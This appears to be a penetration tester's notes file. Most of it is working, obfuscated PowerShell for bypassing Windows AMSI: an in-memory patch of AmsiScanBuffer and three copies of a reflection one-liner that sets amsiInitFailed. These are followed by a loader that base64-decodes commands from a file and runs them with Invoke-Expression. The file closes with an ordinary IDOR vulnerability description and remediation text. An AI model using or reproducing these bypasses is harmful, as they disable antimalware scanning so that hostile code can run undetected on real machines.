# AMSI-Bypass
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
	[DllImport("kernel32")]
 	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  	[DllImport("kernel32")]
   	public static extern IntPtr LoadLibrary(string name);
    	[DllImport("kernel32")]
     	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); 
} 

"@ 

Add-Type $ZQCUW 

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))") 
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))") 
$p = 0 
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) 
$TLML = "0xB8" 
$PURX = "0x57" 
$YNWL = "0x00" 
$RTGX = "0x07" 
$XVON = "0x80" 
$WRUD = "0xC3" 
$KTMJX = [Byte[]] ($TLML, $PURX, $YNWL, $RTGX, + $XVON, + $WRUD) 
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

==========================================================================
S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})


S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})

=============================================================

! Define the path to the text file containing the Base64-encoded PowerShell commands

$encodedFilePath = "path\to\your\encodedfile.txt"

! Read the Base64-encoded content from the text file

$encodedContent = Get-Content -Path $encodedFilePath

! Decode the Base64-encoded content

$decodedBytes = [System.Convert]::FromBase64String($encodedContent)

$decodedContent = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

! Execute the decoded PowerShell commands

Invoke-Expression $decodedContent


=============================================================

Insecure Direct Object Reference (IDOR) via Transaction ID Manipulation
Description: Insecure Direct Object Reference (IDOR) via transaction ID manipulation occurs when an application fails to properly authorize access to transaction data. By altering the transaction ID in the URL or request parameters, an attacker can access other users' transaction data, which should not be visible to them.

Impact: This vulnerability can lead to unauthorized access to sensitive financial information, privacy violations, and potential regulatory non-compliance. Attackers can exploit this to view, modify, or manipulate transaction data of other users, leading to severe data breaches and loss of user trust.

Remediation: Implement strict authorization checks to verify that the requesting user has permission to access the specified transaction. Use indirect references or opaque identifiers for transactions instead of direct IDs. Regularly review and test the application for IDOR vulnerabilities.

Implement strict authorization checks to ensure that the requesting user has permission to access the specified transaction. Use indirect references or opaque identifiers for transaction IDs instead of direct IDs. Secure URL and API endpoints to prevent exposure of sensitive information. Validate and sanitize all input parameters to prevent manipulation. Employ session tokens and access control mechanisms, such as ACLs or RBAC, to manage permissions.

Reference:

OWASP IDOR
One-liner recommendation: "It is recommended to implement strict authorization checks and use indirect references for transaction IDs to prevent IDOR vulnerabilities."
